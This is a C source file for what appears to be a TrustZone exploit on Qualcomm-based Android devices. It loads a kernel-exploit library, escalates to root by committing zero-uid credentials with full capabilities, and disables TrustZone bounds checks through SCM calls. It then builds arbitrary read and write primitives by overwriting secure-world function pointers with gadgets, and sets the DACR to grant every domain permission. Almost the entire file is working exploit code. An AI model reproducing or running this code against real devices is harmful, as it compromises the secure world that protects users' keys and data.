#include <dlfcn.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include "scm.h"
#include "kernel_inc.h"
#include "symbols.h"
#include "defs.h"

/**
 * The physical address which is treated as a dropspace by the exploit.
 */
#define JUNK_PHYS_ADDR (0x8000)

/**
 * The address of the kallsyms_lookup_name function in kernel space.
 */
uint32_t (*kallsyms_lookup_name)(const char* name) = (uint32_t(*)(const char*))KALLSYMS_LOOKUP_NAME;

/**
 * Function exported by the Linux kernel exploit, which does the necessary preparations
 * in order to enable kernel code execution. 
 * Must be called *before* calling execute_in_kernel.
 * @return Zero if successful, a negative linux error code otherwise.
 */
int(*enable_kernel_code_exec)(void);

/**
 * Executes the given piece of code within the Linux kernel.
 * @param func The function to be executed in the kernel.
 * @return Zero if successful, a negative linux error code otherwise.
 */
int(*execute_in_kernel)(void(*)(void));

/****************** START OF DYNAMICALLY LOADED KERNEL SYMBOLS ******************/
int32_t (*scm_call_atomic1)(uint32_t svc, uint32_t cmd, uint32_t arg1);
int32_t (*scm_call_atomic2)(uint32_t svc, uint32_t cmd, uint32_t arg1, uint32_t arg2);
int32_t (*scm_call_atomic3)(uint32_t svc, uint32_t cmd, uint32_t arg1, uint32_t arg2, uint32_t arg3);
int32_t (*scm_call_atomic4_3)(uint32_t svc, uint32_t cmd, uint32_t arg1, uint32_t arg2,
                              uint32_t arg3, uint32_t arg4, uint32_t* ret1, uint32_t* ret2);
int (*scm_call)(uint32_t svc_id, uint32_t cmd_id, const void *cmd_buf,
                size_t cmd_len, void *resp_buf, size_t resp_len);
struct cred* (*prepare_creds)(void);
int (*commit_creds)(struct cred*);
void (*scm_inv_range)(uint32_t start, uint32_t end);
void (*v7_flush_kern_cache_all)(void);
void* (*kmalloc)(uint32_t, uint32_t);
void (*kfree)(void*);
/******************* END OF DYNAMICALLY LOADED KERNEL SYMBOLS *******************/

/**
 * Dynamically loads the used symbols from the Linux kernel, using kallsyms.
 */
void find_symbols(void) {
	scm_call_atomic1 =          (int32_t(*)(uint32_t,uint32_t,uint32_t))
                                kallsyms_lookup_name("scm_call_atomic1");
	scm_call_atomic2 =          (int32_t(*)(uint32_t,uint32_t,uint32_t,uint32_t))
                                kallsyms_lookup_name("scm_call_atomic2");
	scm_call_atomic3 =          (int32_t(*)(uint32_t,uint32_t,uint32_t,uint32_t,uint32_t))
                                kallsyms_lookup_name("scm_call_atomic3");
	scm_call_atomic4_3 =        (int32_t(*)(uint32_t,uint32_t,uint32_t,uint32_t,uint32_t,uint32_t,uint32_t*,uint32_t*))
                                kallsyms_lookup_name("scm_call_atomic4_3");
	scm_call =                  (int(*)(uint32_t,uint32_t,const void*,size_t,void*,size_t))
                                kallsyms_lookup_name("scm_call");
	prepare_creds =             (struct cred*(*)(void))
                                kallsyms_lookup_name("prepare_creds");
	commit_creds =              (int(*)(struct cred*))
                                kallsyms_lookup_name("commit_creds");
	scm_inv_range =             (void(*)(uint32_t,uint32_t))
                                kallsyms_lookup_name("scm_inv_range");
	v7_flush_kern_cache_all =   (void(*)(void))
                                kallsyms_lookup_name("v7_flush_kern_cache_all");
	kmalloc =                   (void*(*)(uint32_t,uint32_t))
                                kallsyms_lookup_name("__kmalloc");
	kfree =                     (void(*)(void*))
                                kallsyms_lookup_name("kfree");
}

/**
 * Elevates privileges to root. Execute only within the kernel.
 */
void elevate_to_root(void) {
	struct cred* c = prepare_creds();
	c->uid = 0;
	c->gid = 0;
	c->suid = 0;
	c->sgid = 0;
	c->euid = 0;
	c->egid = 0;
	c->fsuid = 0;
	c->fsgid = 0;
	c->cap_inheritable.cap[0] = c->cap_inheritable.cap[1] = 0xFFFFFFFF;
	c->cap_permitted.cap[0] = c->cap_permitted.cap[1] = 0xFFFFFFFF;
	c->cap_effective.cap[0] = c->cap_effective.cap[1] = 0xFFFFFFFF;
	c->cap_bset.cap[0] = c->cap_bset.cap[1] = 0xFFFFFFFF;
	commit_creds(c);
}

/**
 * Flushes all caches and invalidates all memory ranges.
 */
void flush_caches(void) {
    v7_flush_kern_cache_all();
    scm_inv_range(0, 0xFFFFFFFF);
}

/**
 * Reads a single DWORD value from the given physical memory address.
 * @param addr The physical memory address.
 * @param val The pointer to which the read value is written.
 * @return Zero if successful, a negative linux error code otherwise.
 */
int read_phys(uint32_t addr, uint32_t* val) {

	int fd = open("/dev/mem", O_RDONLY);
	if (fd < 0)
		return -errno;
	if (lseek(fd, addr, SEEK_SET) < 0) {
		close(fd);
		return -errno;
	}
	if (read(fd, val, sizeof(uint32_t)) < 0) {
		close(fd);
		return -errno;
	}
	close(fd);
	return 0;

}

/**
 * Uses the exploit primitive in order to zero out a DWORD at a given physical
 * memory address.
 * @param target_physical_address The address at which to zero out a DWORD.
 */
void zero_dword(uint32_t target_physical_address) {
	scm_call_atomic2(SCM_SVC_ES, SCM_IS_ACTIVATED_ID, target_physical_address, 0);
}

uint32_t g_version_code = 0;
uint32_t g_fver_ret_addr = 0;
uint32_t g_fver_len = 0;
uint32_t g_random_value_addr = 0;
uint32_t g_random_value_len = 0;
uint32_t g_write_dword_addr = 0;
uint32_t g_write_dword_val = 0;
uint32_t g_read_dword_addr = 0;
uint32_t g_dacr_value = 0;

/**
 * Disables the bounds checks in the TrustZone kernel.
 */
void disable_bounds_checks(void) {

	zero_dword(BOUNDS_CHECK_DWORD_ADDRESS);
	for (uint32_t addr = BOUNDS_CHECKS_RANGE_START; addr < BOUNDS_CHECKS_RANGE_END; addr += sizeof(uint32_t)) {
		zero_dword(addr);
	}

}

/**
 * Writes g_random_value_len random bytes to g_random_value_addr.
 */
void exec_write_random_value(void) {
	v7_flush_kern_cache_all();
	scm_call_atomic2(SCM_SVC_PRNG, SCM_PRNG_GETDATA, g_random_value_addr, g_random_value_len);
	scm_inv_range(0, 0xFFFFFFFF);
}

/**
 * Returns the version code g_version_code into g_fver_ret_addr with a length g_fver_len.
 */
void exec_fver_get_version(void) {
	v7_flush_kern_cache_all();
	scm_call_atomic3(SCM_SVC_INFO, TZ_INFO_GET_FEATURE_VERSION_ID, g_version_code, g_fver_ret_addr, g_fver_len);
	scm_inv_range(0, 0xFFFFFFFF);
}

/**
 * Writes the given amount of random bytes to the given memory address.
 * @param addr The address to which the values are written.
 * @param len The number of bytes to write.
 */
void write_random_value(uint32_t addr, uint32_t len) {
	g_random_value_addr = addr;
	g_random_value_len = len;
	execute_in_kernel(exec_write_random_value);
}

/**
 * Executes the fver_get_version SMC call with the given arguments.
 * @param version_code The version being retrieved.
 * @param ret_addr The address to which the version is written.
 * @param ver_len the length of the version field.
 */
void fver_get_version(uint32_t version_code, uint32_t ret_addr, uint32_t ver_len) {
	g_version_code = version_code;
	g_fver_ret_addr = ret_addr;
	g_fver_len = ver_len;
	execute_in_kernel(exec_fver_get_version);
}

/**
 * A slow primitive which is used to write the given DWORD to the given memory address.
 * @param address The address to which the DWORD is written.
 * @param dword The DWORD value to be written.
 */
void write_dword_slow(uint32_t address, uint32_t dword) {
	//First of all, we need to start fuzzing the value using the PRNG call into the dump zone
	//The dump zone used is the pointer returned from the fver_get_version call, with version code 0.
	//Once we manage to fuzz the DWORD successfully, we can use the fver_get_version call to write that
	//DWORD to arbitrary memory
	//NOTE: For this method to work, the bounds checks must be disabled!        
	char* dword_bytes = (char*)&dword;
	uint32_t current_dword = 0;
	for (int i=0; i<sizeof(uint32_t); i++) {
		fver_get_version(0, JUNK_PHYS_ADDR, sizeof(uint32_t));
		read_phys(JUNK_PHYS_ADDR, &current_dword);
	 	printf("Wanted %02X at idx %d, current value: %08X\n", dword_bytes[i], i, current_dword);
		while (((char*)&current_dword)[i] != dword_bytes[i]) {
			write_random_value(VERSION_CODE_0_DWORD_ADDRESS+i, 1);
			fver_get_version(0, JUNK_PHYS_ADDR, sizeof(uint32_t));
			read_phys(JUNK_PHYS_ADDR, &current_dword);
	 		printf("Wanted %02X at idx %d, current value: %08X\n", dword_bytes[i], i, current_dword);
		}
		printf("Got a byte!\n");
	}

	//Getting the version dword into the destination address
	fver_get_version(0, address, sizeof(uint32_t));
}

/**
 * Writes the value g_write_dword_val to the physical address g_write_dword_addr.
 */
void exec_write_dword_fast(void) {
	v7_flush_kern_cache_all();
	scm_call_atomic2(SCM_SVC_INFO, TZ_INFO_GET_DIAG, g_write_dword_val, g_write_dword_addr);
	scm_inv_range(0, 0xFFFFFFFF);
}

/**
 * A fast primitive which is used to write the given DWORD to the given memory address.
 * @param addr The address to which the DWORD is written.
 * @param dword The DWORD value to be written.
 */
void write_dword_fast(uint32_t addr, uint32_t dword) {
	g_write_dword_addr = addr;
	g_write_dword_val = dword;
	execute_in_kernel(exec_write_dword_fast);
}

/**
 * Reads the DWORD at g_read_dword_addr into the junk physical address.
 */
void exec_read_dword_fast(void) {
	v7_flush_kern_cache_all();
	scm_call_atomic2(SCM_SVC_UTIL, TZ_UTIL_SEC_ALLOWS_MEMDUMP, JUNK_PHYS_ADDR, g_read_dword_addr);
	scm_inv_range(0, 0xFFFFFFFF);
}

/**
 * A fast primitive which is used to read the DWORD at the given address.
 * @param addr The address from which the DWORD is read.
 * @return The DWORD value read.
 */
uint32_t read_dword_fast(uint32_t addr) {
	g_read_dword_addr = addr;
	execute_in_kernel(exec_read_dword_fast);
	uint32_t val;
	read_phys(JUNK_PHYS_ADDR, &val);
	return val;
}

/**
 * Sets the DACR to g_dacr_value.
 */
void exec_set_dacr(void) {
	v7_flush_kern_cache_all();
	scm_call_atomic2(SCM_SVC_UTIL, TZ_UTIL_SEC_ALLOWS_MEMDUMP, g_dacr_value, 0);
}

/**
 * Sets the DACR to the given value.
 * @param g_dacr_value The value to which the DACR is set.
 */
void set_dacr(uint32_t dacr) {
	g_dacr_value = dacr;
	execute_in_kernel(exec_set_dacr);
}

int main() {

	//Loading the symbols
	void* lib = dlopen(KERNEL_EXPLOIT_PATH, RTLD_NOW);	
	enable_kernel_code_exec = (int(*)(void))dlsym(lib, "enable_kernel_code_exec");
	execute_in_kernel = (int(*)(void(*)(void)))dlsym(lib, "execute_in_kernel");

	//Enabling code-exec
	int res = enable_kernel_code_exec();
	if (res < 0) {
		printf("[-] Failed to enable kernel code exec: %d\n", res);
		return res;
	}	
	printf("[+] Enabled kernel code exec\n");

	//Loading the needed symbols using kallsyms
	res = execute_in_kernel(find_symbols);
	if (res < 0) {
		printf("[-] Failed to execute in kernel: %d\n", res);
		return res;
	}
	printf("[+] Loaded symbols\n");

	//Elevating to root
	execute_in_kernel(elevate_to_root);
	printf("[+] UID: %d\n", getuid());
   
	//Disabling the bounds checks
	execute_in_kernel(disable_bounds_checks);
	printf("[+] Disabled bounds checks\n");

	//Writing the address of the write gadget to the location of the write gadget
	write_dword_slow(TZBSP_GET_DIAG_POINTER_ADDRESS, STR_R0_R1_BX_LR);
	printf("[+] Overwrote tzbsp_get_diag with write gadget\n");

	//Restoring the bounds check DWORD
	write_dword_fast(BOUNDS_CHECK_DWORD_ADDRESS, 0x2);
	printf("[+] Re-enabled bounds-check DWORD\n");

	//Enabling the DACR
	set_dacr(0xFFFFFFFF);
	printf("[+] Enabled all domain permissions\n");

	//Writing the fast read gadget
	write_dword_fast(TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS, LDR_R1_R1_STR_R1_R0_BX_LR);
	printf("[+] Wrote read gadget\n");

    //ADD ANY WANTED CODE HERE... 


}
